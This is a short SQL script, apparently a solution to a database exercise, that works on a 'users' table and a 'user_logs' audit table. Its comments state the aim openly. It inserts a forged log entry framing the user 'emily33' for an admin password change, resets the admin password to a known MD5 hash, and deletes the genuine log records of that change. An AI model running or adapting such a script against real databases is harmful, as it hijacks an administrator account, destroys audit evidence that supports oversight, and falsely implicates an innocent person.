-- Start transaction to ensure all or nothing execution
BEGIN TRANSACTION;

-- Frame emily33 by inserting a record to the database which shows that the admin's password is changed to hers
-- This will only execute if emily33 exists in the users table
INSERT INTO "user_logs"("type", "old_username", "new_username", "old_password", "new_password")
SELECT 'update', 'admin', 'admin', u1."password", u2."password"
FROM "users" u1, "users" u2
WHERE u1."username" = 'admin' AND u2."username" = 'emily33';

-- ALTER password of admin to "oops!" hashed by MD5
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- Erase any logs of the above password change from the database
-- Adjust the criteria as necessary to target only the relevant log entries
DELETE FROM "user_logs"
WHERE "type" = 'update'
AND "old_username" = 'admin'
AND "new_username" = 'admin'
AND "old_password" <> '982c0381c279d139fd221fce974916e7'
AND "new_password" = '982c0381c279d139fd221fce974916e7';

-- Commit the transaction to finalize the changes
COMMIT;
